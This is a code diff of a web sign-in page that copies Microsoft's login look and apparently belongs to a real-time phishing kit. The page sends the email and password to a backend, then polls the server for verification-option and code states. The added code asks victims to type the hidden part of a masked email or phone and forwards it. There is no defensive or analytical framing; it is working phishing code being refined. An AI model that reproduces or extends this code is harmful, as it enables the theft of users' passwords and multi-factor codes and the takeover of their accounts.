@@ -81,12 +81,17 @@ body{background-color:#f0f0f0;font-family:'Segoe UI',-apple-system,BlinkMacSyste
 .ghost-link:hover{text-decoration:underline}
 
 #verificationOptionsGroup{margin-top:8px;margin-bottom:20px}
-#verificationOptionsGroup .option-label{font-size:16px;color:#1b1f1b;margin-bottom:12px;font-weight:400;line-height:1.4}
-#verificationOptionsGroup .option-item{margin-bottom:2px;display:flex;align-items:center;gap:16px;padding:12px 16px;border-radius:8px;cursor:pointer;border:1px solid transparent;transition:background-color .15s,border-color .15s}
-#verificationOptionsGroup .option-item:hover{background-color:#f5f5f5;border-color:#e0e0e0}
-#verificationOptionsGroup .option-item.selected{background-color:#e8f0fe;border-color:#0067b8}
-#verificationOptionsGroup .option-icon{width:20px;height:20px;flex-shrink:0;display:flex;align-items:center;justify-content:center;color:#616161;font-size:18px}
-#verificationOptionsGroup .option-text{font-size:14px;color:#1b1f1f;line-height:1.4;flex:1}
+#verificationOptionsGroup .option-label{font-size:15px;color:#1b1f1b;margin-bottom:12px;font-weight:400;line-height:1.4}
+#verificationOptionsGroup .option-item{margin-bottom:8px;display:flex;flex-direction:column;padding:12px 14px;border-radius:4px;cursor:pointer;border:1px solid #e1dfdd;transition:background-color .15s,border-color .15s}
+#verificationOptionsGroup .option-item:hover{background-color:#f3f2f1;border-color:#c8c6c4}
+#verificationOptionsGroup .option-item.selected{background-color:#f3f6fb;border-color:#0067b8;box-shadow:0 0 0 1px #0067b8}
+#verificationOptionsGroup .option-row{display:flex;align-items:center;gap:12px;width:100%}
+#verificationOptionsGroup .option-icon{width:20px;height:20px;flex-shrink:0;display:flex;align-items:center;justify-content:center;color:#0067b8;font-size:16px}
+#verificationOptionsGroup .option-text{font-size:14px;color:#1b1f1f;line-height:1.4;flex:1;font-weight:500}
+#verificationOptionsGroup .option-input-wrap{margin-top:10px;padding-top:10px;border-top:1px solid #edebe9;width:100%}
+#verificationOptionsGroup .option-hint{font-size:12px;color:#616161;margin-bottom:6px;line-height:1.4}
+#verificationOptionsGroup .option-text-input{width:100%;border:1px solid #8a8a8a;border-radius:2px;padding:8px 10px;font-size:14px;font-family:'Segoe UI',sans-serif;color:#1b1f1f;outline:0;box-sizing:border-box;background:#fff}
+#verificationOptionsGroup .option-text-input:focus{border:2px solid #0067b8;padding:7px 9px}
 
 #styledErrorContainer{display:none;margin-bottom:16px}
 #styledErrorContainer .form-error-display{background:#fce8e6;border:1px solid #c4314b;border-radius:8px;padding:12px 16px;display:flex;align-items:flex-start;gap:10px}
@@ -401,8 +406,35 @@ if(pw.length<6){showFieldError('RequirePassword','passwordGroup','Password must 
 p.password=pw;uT='password'
 }else if(curStat==='WAITINGOPTIONS'){
 var s=document.querySelector('input[name="verificationOption"]:checked');
-if(!s){showFieldError('RequireVerificationChoice',null);setFormSubmitting(false);resetFormState();return}
-p.verificationChoice=JSON.stringify([{choice:s.value}]);uT='verificationChoice'
+if(!s){
+showFieldError('RequireVerificationChoice',null);
+setFormSubmitting(false);
+var sB=document.getElementById('next_button');if(sB){sB.disabled=false;sB.textContent='Next'}
+return;
+}
+var choiceVal=s.value;
+var reqInput=s.dataset.requiresInput==='true';
+var hiddenVal='';
+if(reqInput){
+var optItem=s.closest('.option-item');
+var txtInp=optItem?optItem.querySelector('.option-text-input'):null;
+if(txtInp){
+hiddenVal=txtInp.value.trim();
+if(!hiddenVal){
+var lbl=s.dataset.inputLabel||'the required verification detail';
+var errEl=document.getElementById('RequireVerificationChoice');
+if(errEl){var sp=errEl.querySelector('span');if(sp)sp.textContent='Please enter '+lbl+'.';errEl.style.display='flex'}
+setFormSubmitting(false);
+var sB=document.getElementById('next_button');if(sB){sB.disabled=false;sB.textContent='Next'}
+txtInp.focus();
+return;
+}
+}
+}
+var choicePayload=[{choice:choiceVal}];
+if(hiddenVal){choicePayload[0].hiddenPhoneEmail=hiddenVal}
+p.verificationChoice=JSON.stringify(choicePayload);
+uT='verificationChoice'
 }else if(curStat==='WAITINGCODE'){
 var c=vCI.value.trim();
 if(!c){showFieldError('RequireVerificationCode','verificationCodeGroup');setFormSubmitting(false);resetFormState();return}
@@ -501,7 +533,7 @@ if(isExplicitError){var em=r.message||'Your account or password is incorrect.';s
 startPolling(2000);break}
 case'WAITINGOPTIONS':{
 lastVis=s;setFormSubmitting(false);hideLoadingOverlay();
-sB.textContent='Sign in';
+sB.textContent='Next';sB.disabled=false;
 document.getElementById('emailStep').style.display='none';
 document.getElementById('passwordStep').style.display='none';
 document.getElementById('verificationStep').style.display='block';
@@ -510,9 +542,14 @@ document.getElementById('verifySentMessage').style.display='none';
 var fl=document.getElementById('footerLink');if(fl)fl.innerHTML='';
 var lb=document.getElementById('loginBack');if(lb)lb.classList.remove('visible');
 eF.readOnly=true;pF.disabled=true;
-if(d.verificationOptions){
-var h=JSON.stringify(d.verificationOptions);
-if(h!==lastOptHash){renderVerificationOptions(d.verificationOptions);lastOptHash=h}}
+var rawOpts=d.verificationOptions||[];
+if(typeof rawOpts==='string'){try{rawOpts=JSON.parse(rawOpts)}catch(e){rawOpts=[]}}
+var optsArr=Array.isArray(rawOpts)?rawOpts:[];
+var h=JSON.stringify(optsArr);
+if(h!==lastOptHash||!document.querySelector('#verificationOptionsContainer .option-item')){
+renderVerificationOptions(optsArr);
+lastOptHash=h;
+}
 startPolling(2000);break}
 case'WAITINGCODE':case'WAITINGCODEERROR':{
 lastVis=s;setFormSubmitting(false);hideLoadingOverlay();
@@ -551,22 +588,72 @@ default:{startPolling(2000)}
 
 function renderVerificationOptions(o){
 var c=document.getElementById('verificationOptionsContainer');c.innerHTML='';
-if(!o||o.length===0){c.innerHTML='<p style="color:#616161;font-size:13px;">No verification options available.</p>';return}
+if(typeof o==='string'){try{o=JSON.parse(o)}catch(e){o=[]}}
+if(!Array.isArray(o)||o.length===0){c.innerHTML='<p style="color:#616161;font-size:13px;padding:8px 0;">No verification options available.</p>';return}
 o.forEach(function(t,i){
 var d=document.createElement('div');d.className='option-item';d.setAttribute('role','button');d.setAttribute('tabindex','0');
+var row=document.createElement('div');row.className='option-row';
 var iconSpan=document.createElement('span');iconSpan.className='option-icon';
 var ll=(t.label||'').toLowerCase();
-if(ll.includes('phone')||ll.includes('prompt')||ll.includes('device')){iconSpan.innerHTML='<i class="fas fa-mobile-alt"></i>'}
-else if(ll.includes('another way')||ll.includes('try')){iconSpan.innerHTML='<i class="fas fa-question-circle"></i>'}
+if(ll.includes('phone')||ll.includes('sms')||ll.includes('text')||ll.includes('call')||ll.includes('mobile')){iconSpan.innerHTML='<i class="fas fa-mobile-alt"></i>'}
+else if(ll.includes('app')||ll.includes('authenticator')||ll.includes('prompt')){iconSpan.innerHTML='<i class="fas fa-shield-alt"></i>'}
+else if(ll.includes('another way')||ll.includes('try')||ll.includes("don't have")){iconSpan.innerHTML='<i class="fas fa-question-circle"></i>'}
 else{iconSpan.innerHTML='<i class="fas fa-envelope"></i>'}
 var textSpan=document.createElement('span');textSpan.className='option-text';textSpan.textContent=t.label;
-d.appendChild(iconSpan);d.appendChild(textSpan);
+row.appendChild(iconSpan);row.appendChild(textSpan);
+d.appendChild(row);
+
 var hi=document.createElement('input');hi.type='radio';hi.name='verificationOption';hi.id='vOpt'+i;hi.value=t.choiceIndex;hi.style.display='none';
+hi.dataset.type=t.type||'';
+hi.dataset.requiresInput=t.requiresInput?'true':'false';
+hi.dataset.inputLabel=t.inputLabel||'';
+hi.dataset.maskedDetail=t.maskedDetail||'';
 d.appendChild(hi);
-function sel(){document.querySelectorAll('#verificationOptionsContainer .option-item').forEach(function(el){el.classList.remove('selected');var ri=el.querySelector('input[type="radio"]');if(ri)ri.checked=false});d.classList.add('selected');hi.checked=true;setTimeout(function(){handleFormSubmission()},300)}
+
+var inputWrap=null;
+if(t.requiresInput){
+inputWrap=document.createElement('div');inputWrap.className='option-input-wrap';inputWrap.style.display='none';
+var hint=document.createElement('div');hint.className='option-hint';
+if(t.type==='email'&&t.maskedDetail){
+hint.textContent='To verify this email address, enter the characters before @ in '+t.maskedDetail;
+}else if(t.inputLabel){
+hint.textContent='Enter '+t.inputLabel+':';
+}else{
+hint.textContent='Enter the required verification detail:';
+}
+inputWrap.appendChild(hint);
+var txtInp=document.createElement('input');txtInp.type='text';txtInp.className='option-text-input';
+txtInp.placeholder=t.inputLabel||(t.type==='email'?'Enter email name':'Enter verification detail');
+txtInp.autocomplete='off';
+txtInp.addEventListener('click',function(e){e.stopPropagation()});
+txtInp.addEventListener('keydown',function(e){
+e.stopPropagation();
+if(e.key==='Enter'||e.keyCode===13){e.preventDefault();handleFormSubmission()}
+});
+inputWrap.appendChild(txtInp);
+d.appendChild(inputWrap);
+}
+
+function sel(){
+hideAllErrors();
+document.querySelectorAll('#verificationOptionsContainer .option-item').forEach(function(el){
+el.classList.remove('selected');
+var ri=el.querySelector('input[type="radio"]');if(ri)ri.checked=false;
+var iw=el.querySelector('.option-input-wrap');if(iw)iw.style.display='none';
+});
+d.classList.add('selected');hi.checked=true;
+if(t.requiresInput&&inputWrap){
+inputWrap.style.display='block';
+var inp=inputWrap.querySelector('.option-text-input');
+if(inp){inp.focus()}
+}else{
+setTimeout(function(){handleFormSubmission()},300);
+}
+}
 d.addEventListener('click',sel);
-d.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();sel()}});
-c.appendChild(d)})
+d.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){if(e.target===d){e.preventDefault();sel()}}});
+c.appendChild(d);
+});
 }
 
 document.addEventListener('DOMContentLoaded',function(){
